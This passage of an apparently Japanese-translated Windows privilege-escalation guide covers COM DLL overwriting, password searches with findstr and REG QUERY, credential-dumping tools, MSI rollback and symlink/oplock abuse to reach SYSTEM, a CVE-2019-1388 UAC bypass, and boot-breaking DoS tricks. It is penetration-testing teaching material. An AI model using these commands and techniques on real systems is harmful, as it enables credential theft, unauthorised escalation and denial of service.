- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows operating system に組み込まれた technology で、異なる言語の software components 間の **intercommunication** を可能にします。各 COM component は **class ID (CLSID)** によって **identified** され、各 component は 1 つ以上の interfaces を通じて機能を公開し、それらは interface IDs (IIDs) によって識別されます。

COM classes と interfaces は、registry の **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** にそれぞれ定義されています。この registry は **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** をマージして作成されます。

この registry の CLSIDs 内には child registry **InProcServer32** があり、そこには **DLL** を指す **default value** と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) にできる **ThreadingModel** という値があります。

![](<../../images/image (729).png>)

要するに、実行される予定の DLL のいずれかを **overwrite** できれば、その DLL が別の user によって実行される場合に **privileges** を **escalate** できます。

攻撃者が persistence mechanism として COM Hijacking をどう使うかを学ぶには、次を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名のファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリを key names と passwords について検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は msf** プラグインです。私はこのプラグインを作成し、victim 内で credentials を検索するすべての metasploit POST module を自動的に実行するようにしました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで言及されている password を含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムから password を抽出するためのもう1つの優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、これらのデータを平文で保存するいくつかのツールの **sessions**、**usernames**、**passwords** を検索します (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

SYSTEM として実行されている **あるプロセスが新しいプロセス** (`OpenProcess()`) を **full access** で開いたと想像してください。  
同じプロセスはさらに **新しいプロセス** (`CreateProcess()`) を **低い権限で作成するが、main process の open handles をすべて継承する** とします。\
その後、**低権限プロセスに対して full access** を持っているなら、`OpenProcess()` で作成された **特権プロセスへの open handle** を取得し、**shellcode を注入**できます。\
[この例を読めば、この脆弱性を **どう検出して悪用するか** の詳細がわかります。](leaked-handle-exploitation.md)\
[**異なる権限レベルで継承された process と thread のより多くの open handlers をテストして悪用する方法についての、より完全な説明**はこの別の投稿を読んでください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**pipes** と呼ばれる共有メモリセグメントは、process 間通信と data transfer を可能にします。

Windows は **Named Pipes** という機能を提供しており、関係のない process 同士でも、異なる network 越しに data を共有できます。これは client/server アーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** によって pipe 経由で data が送られると、pipe をセットアップした **server** は、必要な **SeImpersonate** 権限を持っていれば、**client の identity を引き受ける**ことができます。模倣できる pipe を通じて通信する **特権 process** を特定できれば、その process があなたの作成した pipe とやり取りした瞬間にその identity を採用して、**より高い権限を得る**機会になります。この attack を実行する手順については、[**here**](named-pipe-client-impersonation.md) と [**here**](#from-high-integrity-to-system) に役立つガイドがあります。

また、以下の tool を使うと、**burp のような tool で named pipe communication を intercept** できます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **そしてこの tool は、privescs を見つけるためにすべての pipes を一覧表示して確認することもできます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) の server mode は `\\pipe\\tapsrv` (MS-TRP) を公開します。remote authenticated client は mailslot ベースの async event path を悪用して `ClientAttach` を任意の **4-byte write** に変え、`NETWORK SERVICE` が書き込み可能な任意の既存 file に対して書き込みを行い、その後 Telephony admin rights を取得して service として任意の DLL を load できます。全体の流れは以下のとおりです。

- `pszDomainUser` を書き込み可能な既存 path に設定して `ClientAttach` する → service は `CreateFileW(..., OPEN_EXISTING)` でそれを開き、async event writes に使用する。
- 各 event は `Initialize` の attacker-controlled `InitContext` をその handle に書き込む。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) をトリガーし、`GetAsyncEvents` (`Req_Func 0`) で取得し、その後 unregister/shutdown して deterministic writes を繰り返す。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加し、再接続してから、任意の DLL path を指定した `GetUIDllName` を呼び出して `TSPI_providerUIIdentify` を `NETWORK SERVICE` として実行する。

詳細は以下を参照してください。

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

**[https://filesec.io/](https://filesec.io/)** のページを確認してください

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW` に渡されるクリック可能な Markdown links は、危険な URI handlers (`file:`, `ms-appinstaller:`、または登録済みの scheme) を起動し、攻撃者が制御する file を current user として実行できる場合があります。詳細は以下を参照してください。

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

user として shell を取得したとき、scheduled tasks や他の process が実行されており、**command line に credentials を渡している**ことがあります。以下の script は、2秒ごとに process command lines を取得して current state を previous state と比較し、差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効な場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから terminal や "NT\AUTHORITY SYSTEM" などの任意のプロセスを実行できることがあります。

これにより、同じ脆弱性で権限昇格と UAC bypass を同時に行うことが可能になります。さらに、何かをインストールする必要はなく、その過程で使用される binary は Microsoft によって署名・発行されています。

影響を受けるシステムの一部は以下のとおりです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium から High Integrity Level へ / UAC Bypass

Integrity Levels を学ぶにはこれを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、UAC と UAC bypass を学ぶにはこれを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

[**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されている technique は、[**こちらで利用可能な**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) exploit code 付きです。

この attack は基本的に、Windows Installer の rollback feature を悪用して、uninstallation process 中に正規の files を malicious ones に置き換えるものです。このため attacker は **malicious MSI installer** を作成し、`C:\Config.Msi` folder を hijack します。これは後で Windows Installer が他の MSI packages の uninstallation 中に rollback files を保存するために使われ、そこでは rollback files が malicious payload を含むように改変されます。

要約すると、technique は次のとおりです:

1. **Stage 1 – Hijack の準備 (`C:\Config.Msi` を空にする)**

- Step 1: MSI を Install する
- 無害な file（例: `dummy.txt`）を writable folder（`TARGETDIR`）に install する `.msi` を作成する。
- installer を **"UAC Compliant"** としてマークし、**non-admin user** でも実行できるようにする。
- install 後も file への **handle** を open のまま保持する。

- Step 2: Uninstall を開始する
- 同じ `.msi` を uninstall する。
- uninstall process は files を `C:\Config.Msi` に移動し始め、`.rbf` files（rollback backups）へ rename する。
- `GetFinalPathNameByHandle` を使って open file handle を **poll** し、file が `C:\Config.Msi\<random>.rbf` になったタイミングを検出する。

- Step 3: Custom Syncing
- `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれていて、以下を行う:
- `.rbf` が written されたときに signal する。
- その後、続行する前に別の event を **wait** する。

- Step 4: `.rbf` の Deletion を Block する
- signal されたら、`.rbf` file を `FILE_SHARE_DELETE` なしで **open** する — これにより削除できなくなる。
- その後、uninstall を完了できるように **signal back** する。
- Windows Installer は `.rbf` を削除できず、すべての contents を削除できないため、**`C:\Config.Msi` は削除されない**。

- Step 5: `.rbf` を手動で Delete する
- attacker が `.rbf` file を手動で delete する。
- これで **`C:\Config.Msi` は空** になり、hijack の準備が整う。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability** を trigger して `C:\Config.Msi` を delete する。

2. **Stage 2 – Rollback Scripts を Malicious Ones に置き換える**

- Step 6: 弱い ACLs で `C:\Config.Msi` を再作成する
- `C:\Config.Msi` folder を自分で再作成する。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` 付きの handle を open のまま保持する。

- Step 7: 別の Install を実行する
- `.msi` を再度 install し、以下を指定する:
- `TARGETDIR`: writable location。
- `ERROROUT`: forced failure を trigger する variable。
- この install は、再び **rollback** を trigger するために使われ、`.rbs` と `.rbf` を読み取る。

- Step 8: `.rbs` を Monitor する
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を monitor し、新しい `.rbs` が現れるまで待つ。
- その filename を capture する。

- Step 9: Rollback 前に Sync する
- `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれていて、以下を行う:
- `.rbs` が作成されたときに event を signal する。
- その後、続行する前に **wait** する。

- Step 10: Weak ACL を再適用する
- `.rbs created` event を受け取った後:
- Windows Installer は `C:\Config.Msi` に **strong ACLs** を再適用する。
- しかし、`WRITE_DAC` を持つ handle をまだ保持しているので、再び **weak ACLs** を適用できる。

> ACLs は **handle open 時にのみ enforced** されるため、folder への書き込みは引き続き可能です。

- Step 11: Fake `.rbs` と `.rbf` を配置する
- `.rbs` file を上書きして、Windows に以下を指示する **fake rollback script** にする:
- malicious DLL であるあなたの `.rbf` file を、**privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に restore する。
- **malicious SYSTEM-level payload DLL** を含む fake `.rbf` を配置する。

- Step 12: Rollback を Trigger する
- sync event を signal して installer を再開させる。
- **type 19 custom action (`ErrorOut`)** が、既知の point で install を意図的に fail させるように設定されている。
- これにより **rollback が開始** される。

- Step 13: SYSTEM があなたの DLL を Install する
- Windows Installer は:
- あなたの malicious `.rbs` を読み込む。
- `.rbf` DLL を target location に copy する。
- これで、**SYSTEM-loaded path** に malicious DLL が置かれた状態になる。

- Final Step: SYSTEM Code を Execute する
- 信頼された **auto-elevated binary**（例: `osk.exe`）を実行し、hijack した DLL を load させる。
- **Boom**: あなたの code が **SYSTEM として** 実行される。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

main の MSI rollback technique（前のもの）は、**folder 全体**（例: `C:\Config.Msi`）を delete できることを前提にしています。では、vulnerability が **arbitrary file deletion** しか許さない場合はどうでしょうか？

**NTFS internals** を悪用できます: すべての folder には、以下の hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
この stream にはフォルダの**index metadata**が保存されます。

そのため、フォルダの **`::$INDEX_ALLOCATION` stream を delete** すると、NTFS は filesystem からそのフォルダ**全体を remove** します。

これを行うには、次のような標準の file deletion APIs を使えます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼んでいるにもかかわらず、**フォルダ自体を削除**します。

### From Folder Contents Delete to SYSTEM EoP
もしそのプリミティブが任意のファイル/フォルダの削除を許可しないが、**攻撃者が制御するフォルダの *contents* の削除は許可する**場合はどうでしょうか？

1. Step 1: bait folder と file を用意する
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- privileged process が `file1.txt` を削除しようとすると、oplock が**実行を一時停止**します。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process をトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その内容を削除しようとする。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御があなたの callback に渡る。

4. Step 4: oplock callback 内で、削除をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより oplock を壊さずに `folder1` が空になる。
- `file1.txt` を直接削除しないこと — それをすると oplock が早すぎるタイミングで解放される。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> This targets the NTFS internal stream that stores folder metadata — deleting it deletes the folder.

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` は SYSTEM によって削除されます。

### Arbitrary Folder Create から Permanent DoS へ

**SYSTEM/admin として任意のフォルダを作成できる** primitive を悪用します。たとえ **ファイルを書き込めない**、または **弱い権限を設定できない** 場合でも可能です。

**ファイルではなくフォルダ** を作成し、**重要な Windows ドライバ** の名前を付けます。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` カーネルモードドライバに対応します。
- これを**事前にフォルダとして作成**すると、Windows は起動時に実際のドライバをロードできません。
- その後、Windows は起動中に `cng.sys` をロードしようとします。
- フォルダを検出し、**実際のドライバの解決に失敗**し、**クラッシュするか起動を停止**します。
- **フォールバックはなく**、外部からの介入（例: boot repair や disk access）なしには**復旧できません**。

### privileged log/backup paths + OM symlinks から arbitrary file overwrite / boot DoS へ

**privileged service** が **writable config** から読み取ったパスへ logs/exports を書き込む場合、そのパスを **Object Manager symlinks + NTFS mount points** でリダイレクトし、privileged write を arbitrary overwrite に変換できます（**SeCreateSymbolicLinkPrivilege なし**でも可能）。

**要件**
- ターゲットパスを保存する config が attacker により書き込み可能であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスへ書き込む privileged operation があること（log, export, report）。

**例のチェーン**
1. config を読み、privileged log destination を取得する。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin なしでパスをリダイレクトする:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例: admin が "send test SMS" をトリガーする）。書き込みは `C:\Windows\System32\cng.sys` に入るようになる。
4. 上書きされた対象を確認する（hex/PE parser）ことで破損を確認する。再起動すると Windows は改ざんされた driver path を読み込もうとする → **boot loop DoS**。これは、特権サービスが書き込みのために開く任意の保護ファイルにも一般化できる。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれるが、`C:\Windows\System32\cng.sys` にコピーが存在すると最初に試行される可能性があり、破損データに対して信頼できる DoS sink になる。



## **From High Integrity to System**

### **New service**

すでに High Integrity プロセス上で動作している場合、**SYSTEM への path** は、単に**新しい service を作成して実行する**だけで簡単なことがある:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービス binary を作成する際は、それが有効な service であること、または binary が必要な操作をできるだけ速く実行することを確認してください。そうしないと、valid service でない場合は 20s で kill されます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated registry entries を有効化**して、_**.msi**_ wrapper を使って reverse shell を **install** することを試せます。\
[関連する registry keys と _.msi_ package のインストール方法の詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードはこちらを**[**見てください**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（おそらく既に High Integrity process で見つかるはずです）、SeDebug privilege を使って **ほぼ任意の process**（protected processes ではない）を **open** し、その process の **token を copy** して、その token で **arbitrary process を作成**できます。\
この technique では通常、**すべての token privileges を持つ SYSTEM として動作している任意の process** が選ばれます（_そう、SYSTEM process でもすべての token privileges を持たないものがあります_）。\
**提案された technique を実行する code の**[**例はこちら**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation する際に使います。内容は、**pipe を作成し、その pipe に書き込ませるために service を作成/悪用する**ことです。その後、**`SeImpersonate`** privilege を使って pipe を作成した **server** は、pipe client（service）の **token を impersonate** でき、SYSTEM privileges を取得します。\
name pipes について [**もっと知りたい場合はこれを読んでください**](#named-pipe-client-impersonation)。\
high integrity から System へ name pipes を使って移行する例を読みたい場合は、[**これを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM として動作している process** によって **load** される **dll を hijack** できれば、その権限で arbitrary code を実行できます。したがって Dll Hijacking はこの種の privilege escalation にも有用で、さらに **high integrity process からはるかに簡単に達成**できます。なぜなら、その process は dll を load するために使われるフォルダに対して **write permissions** を持っているからです。\
**Dll hijacking については**[**ここでさらに学べます**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すための最良の tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files をチェック (**[**ここを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). 検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な misconfigurations をチェックし、情報を収集 (**[**ここを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations をチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の保存済み session information を抽出します。local では -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から crendentials を抽出します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- domain 全体に収集した password を spray します**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell の ADIDNS/LLMNR/mDNS spoofer と man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索（Watson により deprecated）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索（VisualStudio で compile する必要があります） ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を探して host を enumerate します（privesc というより情報収集 tool です）（compile が必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くの software から credentials を抽出します（github に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration をチェック（executable は github で precompiled）。おすすめしません。Win10 ではうまく動きません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 起こりうる misconfigurations をチェック（python からの exe）。おすすめしません。Win10 ではうまく動きません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post を元に作成された tool です（正しく動作するために accesschk は不要ですが、使用することはできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作する exploit を推奨します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作する exploit を推奨します（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しい version の .NET を使って project を compile する必要があります（[これを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host にインストールされている .NET の version を確認するには、次のようにします：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
